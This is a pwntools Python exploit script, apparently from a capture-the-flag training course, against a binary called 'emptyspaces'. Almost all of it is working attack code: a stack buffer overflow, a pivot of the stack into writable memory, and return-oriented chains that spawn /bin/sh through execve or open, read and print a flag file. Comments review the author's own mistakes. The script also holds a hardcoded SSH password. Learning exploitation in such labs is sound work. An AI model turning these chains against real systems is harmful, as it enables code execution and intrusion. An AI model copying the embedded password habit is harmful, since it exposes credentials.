from pwn import *
from getpass import *
import logging
import time
#context(log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
print(len(sys.argv))
if len(sys.argv)==2:
    #REMOTE EXPLOIT
    site = "training.jinblack.it"
    port = 4006
    c =  remote(site,port)
    process = "./emptyspaces"
    script_name, method = sys.argv
else:

    script_name, debug, method = sys.argv

    #SSH EXPLOIT : PLEASE NOTE IT IS NOT POSSIBLE TO USE GDB.DEBUG THROUGH SSH USE GDB.ATTACH
    host = "acidburn"

    ip = "127.0.0.1"

    category = "rop"
    proc = "emptyspaces"
    #path = "/challenges/rop/ropasaurusrex/"
    path = "/challenges/"+category+"/"+proc+"/"
    #prt = int(input(" insert "+host+"'s port to connect to:"))
    prt = 3022

    #pwd = getpass("insert "+host+"'s password:")
    pwd = "0607991337"

    print("Connecting to "+host+" at "+ip+" to execute syscall")
    ssh_p = ssh(host,ip,password=pwd,port= prt)

    process = "."+path+proc

    if ( debug == '-d') :
        gdbc = '''
                   b *0x400be7
                   b *0x400c0e
                   continue
                   b *0x400c14
                   b *0x400416
               '''
        c = gdb.debug( [process], ssh = ssh_p, gdbscript = gdbc )
    else:
        c = ssh_p.process(process)
#we have everything to call sys_execve
    #use >$ ROPgadget --binary emptyspaces | grep ret

#the core idea is to extrapolate all gadgets ending with ret!
    #    >$ ROPgadget --binary emptyspaces \ grep "pop rdi; ret"  to look for your desired gadget
    # we want *filename a pointer to string "/bin/sh" and the others as 0
    # after a first crash with a standard payload instead of debugging via pwndbg we'll use
    #    >$ dmesg
    #there's no canary
    #we need a bin/sh string in memory , either we find it or we write it
    #  we know where our binary is in memory , after the .bss there's a small padding, or we could push it to a reg
    #  and then push it to the stack

    #invoke vmmap to check how the memory is mapped up

    #0x400000           0x4b6000           r-xp    b6000 0      /home/acidburn/challenges/rop/emptyspaces/emptyspaces
    #0x6b6000           0x6bc000           rw-p     6000 b6000  /home/acidburn/challenges/rop/emptyspaces/emptyspaces
    #0x6bc000           0x6e0000           rw-p    24000 0      [heap]
    #0x7ffff7ffb000     0x7ffff7ffe000     r--p     3000 0      [vvar]
    #0x7ffff7ffe000     0x7ffff7fff000     r-xp     1000 0      [vdso]
    #0x7ffffffde000     0x7ffffffff000     rw-p    21000 0      [stack]
    #0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]

    #check sections with rw-p authorization
    #   >$ x/20gx 0x6bc000 -0x20

    #0x6bbfe0 <state>:               0x0000000000000000      0x00000000006e0000
    #0x6bbff0 <max_dirnamelen>:      0x000000000000001a      0x0000000000000000
    #0x6bc000 <textsize>:            0x0000000000000000      0x0000000000000000
    #0x6bc010 <fromidx>:             0x0000000000000000      0x0000000000000000
    #0x6bc020 <tos>:                 0x0000000000000000      0x0000000000000000
    #0x6bc030 <narcs>:               0x0000000000000000      0x0000000000000000
    #0x6bc040 <cachesize>:           0x0000000000000000      0x0000000000000000
    #0x6bc050 <cache>:               0x0000000000000000      0x0000000000000000
    #0x6bc060 <once>:                0x0000000000000000      0x0000000000000000
    #0x6bc070:**                     0x0000000000000000      0x0000000000000000
    #it should be the .bss , please note the last one is UNUSED !
    #we'll get the address of the ssize_t read(- - -) = 0x4497b0
    #we need at least threee gadget

    #lets search
    #   >$ ROPgadget --binary emptyspaces | grep "pop rsi; pop rdi; ret"
    #       --- no result
    #   >$ ROPgadget --binary emptyspaces | grep "pop rdx ; pop rsi ; ret"
    #       --- 0x000000000044bd59 : pop rdx ; pop rsi ; ret
    #
    #rdx should have 8byte addr
    #   >$ ROPgadget --binary emptyspaces | grep "pop rdi; ret"

#unused gadgets and addresses, let them be a future warning
#be more organized about your exploits!
string_addr = 0x7fffffffe960+0x68#WE CANNOT JUMP TO A RANDOMIZED CODE SECTION !!!
when_reached_send_string = 0x400416
#bin_sh = 0x2f62696e2f736800
bin_sh = 0x0068732fe669622f
pop_rbx = 0x400de8
push_rax = 0x4943f3
mov_qword_ptr_rdx_rax = 0x4182d7
mov_rsp_rsi = 0x400b84
pop_rsi = 0x410133

is_complete = 0
is_first = 1
index = 0x3
print(method)
#Writeup: Please consider this a lesson in ideas that are WAY too overcomplicated
#   You had a right idea, which was sending the payload in multiple stages
#   but you commited four mistakes, two fatal and two that would complicate too much the exploit
#   1.(FATAL) You tried to jump inside the stack (see string_addr), that would NEVER work due to ASLR
#   2.(FATAL) You jumped to the fd_space, which is inside the heap and is NOT executable,you should
#             have moved your rsp over there and see what happens
#   3.(Complication) You didn't realize you could jump to the main's read and instead you called your own
#                    this will complicate things a little
#   4.(Complication) Why are you even jumping @ an offset? This is due to the conflicting way you wrote
#                    the exploit, unravelling both your ideas of a orw sequence and a traditional shell
#                    in the same file, this clutters your ideas and confuses you, so please avoid it
#                    in the future!

#required gadgets for this part
pop_rdx_rsi = 0x44bd59
pop_rdi = 0x400696
pop_rsp = 0x401da3
print(b"/bin/sh\x00")

print("What is a p64")
print(p64(pop_rdi))
#'\x96\x06@\x00\x00\x00\x00\x00
#required addresses for this part
call_to_read = 0x4497b0
fd_space = 0x6bca00
flag_space = fd_space + 0x10
#First Part: fill the buffer and call your own read
while( is_complete == 0 ):
    print("BLABLABLA")
    payload = b"\x90"*64       #the buffer
    payload += b"BBBBBBBB"     #RBP
    payload += p64(pop_rdx_rsi)#1.payload -> RIP
    payload += p64(1000)       #this read has ALL the space we require to do our bidding
    payload += p64(fd_space) #you CANNOT jump to string_addr, it is inside the stack
    payload += p64(pop_rdi)
    payload += p64(0)          #0 is fd of stdin
##payload+= p64(call_to_read)#you have crafted your own read
##payload+= p64(fd_space)
    payload += p64(call_to_read)
    payload += p64(pop_rsp)
    payload += p64(fd_space)
    print(len(payload))
    c.recvuntil("Where we used to pwn?\n")
    c.sendline(payload)

#Second part : call a new read, this time back

    print("I have written my shell to a larger space")
### Writeup: here you had one task: read your "/bin/sh" to your "newly" found empty space.
#   You had two choices, send it manually or automatically
#   stage_one is the manual approach and it has two flaws, one fatal and a complication in this case:
#   1.(FATAL) By sending it manually you still have the trailing '\n' in your string,you didn't know
#             how to remove it by this point
#   2.(compl) By doing another call to read you further complicate the required timing to send the
#             "/bin/sh" string, even doing so automatically, the right choice is to use the
#              mov qword ptr [rdi], rdx
#required gadgets for this part
    pop_rax = 0x4155a4
    pop_rdx = 0x4497c5
#required addresses for this part
    empty_space = 0x6bc070
    null_pointer = empty_space + 0x10
    syscall = 0x40128c
    ##1st step. set up your new write to a read
    stage_one = p64(pop_rdx_rsi)
    stage_one += p64(8) #8 was in rdx
    stage_one += p64(empty_space) #pointer to padding area
    stage_one += p64(pop_rdi)
    stage_one += p64(0) #0 is fd of stdin
    stage_one += p64(call_to_read)
    ##2nd step. (finally) set up your syscall to do a sys_execve
    stage_one += p64(pop_rax)
    stage_one += p64(0x3b)
    print("3b is actually")
    print(p64(0x3b))
    stage_one += p64(pop_rdx_rsi)
    stage_one += p64(null_pointer)#rdx
    stage_one += p64(null_pointer)#rsi
    stage_one += p64(pop_rdi)
    stage_one += p64(empty_space)#this now points to a bin/sh instance
    stage_one += p64(syscall)#It enters a loop, what do I do ?


### Writeup: here you resorted to the automatic approach in writing "/bin/sh",
#   this allows you to resolve fatal issue #1 of the trailing new line
#   but introduces another flaw, you didn't use null pointers for rdx and rsi
#   your execve will never load!
#required gadgets for this part
    mov_qword_rdi_rdx =0x435543
#required addresses for this part

##1st step : load address of empty space @ rdi
#stage_one_b  = p64(flag_space)
#stage_one_b += b"\x90"*8
    stage_one_b = p64(pop_rdi)
    stage_one_b += p64(empty_space)
#2nd step: load /bin/sh @ rdx
    stage_one_b += p64(pop_rdx)
    stage_one_b += b"/bin/sh\x00"
#3rd step: load @ addr pointed by rdi the thing /bin/sh string found at rdx
    stage_one_b += p64(mov_qword_rdi_rdx)
#4th step: now setup the sys_execve call, you need to fix rax, rdx and rsi, rdi is ALREADY SET
    stage_one_b += p64(pop_rax)
    stage_one_b += p64(0x3b)
    stage_one_b += p64(pop_rdx_rsi)
    stage_one_b += p64(null_pointer)#0x0)#rdx
    stage_one_b += p64(null_pointer)#0x0)#rsi
    stage_one_b += p64(syscall)

### Writeup : here comes the truly complicated part, the open-read-write
#   sequence,here again you commit two fatal mistakes:
#             1.you used to jump to a stack address to reach this code,
#               thanks to ASLR it will never work
#             2.you have no way to retrieve the fd of your newly opened
#               "./flag", you could guess it, but that is a hack!

#required gadgets for this part

#required variables for this part
    flag = 0x2e2f666c616700
    galf = 0x0067616c662f2e
#required addresses for this part
    call_to_open = 0x4495f0
    call_to_write = 0x449880
    main = 0x400b95
#open the ./flag file
    stage_open  = p64(pop_rax)
    stage_open += p64(0x02)
    stage_open += p64(pop_rdi)
    stage_open += p64(empty_space)
    stage_open += p64(pop_rdx)
    stage_open += p64(galf)
    stage_open += p64(mov_qword_rdi_rdx)#
    stage_open += p64(pop_rdx_rsi)
    stage_open += p64(0x0)
    stage_open += p64(0x0)
    stage_open += p64(call_to_open)
    #read it to somewhere in memory
    stage_read  = p64(pop_rdi)
    stage_read += p64(index)
    stage_read += p64(pop_rax)
    stage_read += p64(0x0)
    stage_read += p64(pop_rdx_rsi)
    stage_read += p64(0x40)
    stage_read += p64(fd_space+0x100)
    stage_read += p64(call_to_read)
    #now write it to stdout
    stage_write = p64(pop_rdi)
    stage_write += p64(0x1)
    stage_write += p64(pop_rdx_rsi)
    stage_write += p64(0x40)
    stage_write += p64(fd_space+0x100)
    stage_write += p64(pop_rax)
    stage_write += p64(0x1)
    stage_write += p64(call_to_write)
    if( len(sys.argv) == 2 and method == '-o'):
        stage_write += p64(main)

### Writeup, to fix the missing fd the only thing which we could do is to iterate on main's read
#            please note that this method DOES NOT WORK !
    print(method)
    if ( method == '-o' ):
        print("assembling open-read-write sequence")
        if( is_first == 1):
            stage_two = stage_open +stage_read+stage_write
        else:
            stage_two = stage_read + stage_write
        time.sleep(0.1)
        c.send(stage_two)
        if( len(sys.argv) == 2 ):#this means I'm remote
            is_first = 0
            index = index + 0x1
            print("going to the next step"+ str(index))
        else:
            is_complete = 1
    else:
        print("crafting a shell")
        time.sleep(0.1)
        c.send(stage_one_b)
        is_complete = 1
    #c.interactive()
